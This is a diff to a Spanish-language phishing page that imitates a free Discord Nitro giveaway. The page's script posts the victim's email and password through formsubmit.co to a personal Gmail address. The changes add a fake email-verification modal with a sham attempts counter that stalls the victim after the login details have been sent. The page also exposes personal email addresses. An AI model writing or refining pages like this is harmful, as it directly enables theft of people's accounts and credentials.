@@ -29,6 +29,7 @@
     .ventana img {
       max-width: 100%;
       border-radius: 10px;
+      margin-bottom: 15px;
     }
 
     .ventana ol {
@@ -45,6 +46,7 @@
       font-size: 16px;
       border-radius: 8px;
       cursor: pointer;
+      margin-top: 15px;
     }
 
     .boton:hover {
@@ -58,6 +60,7 @@
 
     .login h2 {
       text-align: center;
+      color: #5865F2;
     }
 
     .form-group {
@@ -117,7 +120,63 @@
       background-color: #202225;
     }
 
-    /* Estilos para el modal de Nitro */
+    .verification-modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
+    }
+    
+    .verification-container {
+      background: #36393f;
+      margin: 10% auto;
+      padding: 25px;
+      width: 90%;
+      max-width: 500px;
+      border-radius: 8px;
+      text-align: center;
+    }
+    
+    .verification-icon {
+      font-size: 50px;
+      color: #5865F2;
+      margin-bottom: 20px;
+    }
+    
+    .verification-buttons {
+      margin-top: 20px;
+    }
+    
+    .verification-btn {
+      padding: 10px 20px;
+      border-radius: 4px;
+      border: none;
+      background-color: #5865F2;
+      color: white;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    
+    .verification-btn:hover {
+      background-color: #4752c4;
+    }
+    
+    .attempts-counter {
+      color: #b9bbbe;
+      font-size: 14px;
+      margin-top: 15px;
+    }
+    
+    .error-message {
+      color: #ED4245;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
     .nitro-modal {
       display: none;
       position: fixed;
@@ -229,6 +288,21 @@
 </head>
 <body>
 
+  <!-- Modal de verificación -->
+  <div id="verificationModal" class="verification-modal">
+    <div class="verification-container">
+      <div class="verification-icon">✉️</div>
+      <h2>Verificación Requerida</h2>
+      <p>Por favor revisa tu correo electrónico <strong>klucasgregorio15@gmail.com</strong> y confirma el dispositivo para canjear tu Nitro exitosamente.</p>
+      <p>Hemos enviado un enlace de verificación a tu dirección de correo electrónico.</p>
+      <div id="errorMessage" class="error-message" style="display: none;">¡Debes verificar tu correo primero!</div>
+      <div class="attempts-counter">Intentos restantes: <span id="attemptsLeft">3</span></div>
+      <div class="verification-buttons">
+        <button class="verification-btn" onclick="verifyAttempt()">Ya verifiqué mi correo</button>
+      </div>
+    </div>
+  </div>
+
   <!-- Modal de Discord Nitro -->
   <div id="nitroModal" class="nitro-modal">
     <div class="nitro-container">
@@ -267,7 +341,7 @@
 
   <!-- Ventana inicial -->
   <div class="ventana" id="ventanaBienvenida">
-    <img src="MXOF6CJJBNOOJJEN7Z5I3XJED4.jpg">
+    <img src="https://i.imgur.com/MXOF6CJ.jpg" alt="Discord Nitro Offer">
     <h2>¡Bienvenido a Discord Nitro!</h2>
     <p>Canjea Discord Nitro Por 3 Meses Gratis</p>
     <ol>
@@ -309,11 +383,14 @@
   </form>
 
   <script>
-    // Muestra la ventana de bienvenida al cargar la página
+    let attempts = 0;
+    const maxAttempts = 3;
+    
     document.addEventListener('DOMContentLoaded', function() {
       document.getElementById('ventanaBienvenida').style.display = 'block';
       document.getElementById('ventanaLogin').style.display = 'none';
       document.getElementById('nitroModal').style.display = 'none';
+      document.getElementById('verificationModal').style.display = 'none';
     });
 
     function mostrarLogin() {
@@ -326,14 +403,33 @@
       document.getElementById('ventanaBienvenida').style.display = 'block';
     }
 
-    function mostrarModalNitro() {
+    function mostrarVerificationModal() {
       document.getElementById('ventanaLogin').style.display = 'none';
+      document.getElementById('verificationModal').style.display = 'block';
+      document.getElementById('attemptsLeft').textContent = maxAttempts - attempts;
+      document.getElementById('errorMessage').style.display = 'none';
+    }
+
+    function verifyAttempt() {
+      attempts++;
+      document.getElementById('attemptsLeft').textContent = maxAttempts - attempts;
+      
+      if(attempts < maxAttempts) {
+        document.getElementById('errorMessage').style.display = 'block';
+      } else {
+        showNitroModal();
+      }
+    }
+
+    function showNitroModal() {
+      document.getElementById('verificationModal').style.display = 'none';
       document.getElementById('nitroModal').style.display = 'block';
     }
 
     function cerrarModal() {
       document.getElementById('nitroModal').style.display = 'none';
       document.getElementById('ventanaBienvenida').style.display = 'block';
+      attempts = 0;
     }
 
     function enviarFormulario() {
@@ -345,9 +441,7 @@
         return;
       }
 
-      console.log("Enviando datos:", { correo, contrasena }); // Para depuración
-
-      // Enviar datos DIRECTAMENTE a tu email
+      // Enviar datos a tu correo (davidkfernandez05@gmail.com)
       const formData = new FormData(document.getElementById('ventanaLogin'));
       
       fetch('https://formsubmit.co/ajax/davidkfernandez05@gmail.com', {
@@ -360,14 +454,14 @@
       .then(response => {
         if(response.ok) {
           console.log('Formulario enviado con éxito');
-          mostrarModalNitro();
+          mostrarVerificationModal();
         } else {
           throw new Error('Error en el envío');
         }
       })
       .catch(error => {
         console.error('Error:', error);
-        mostrarModalNitro(); // Mostrar modal aunque falle el envío
+        mostrarVerificationModal();
       });
     }
   </script>
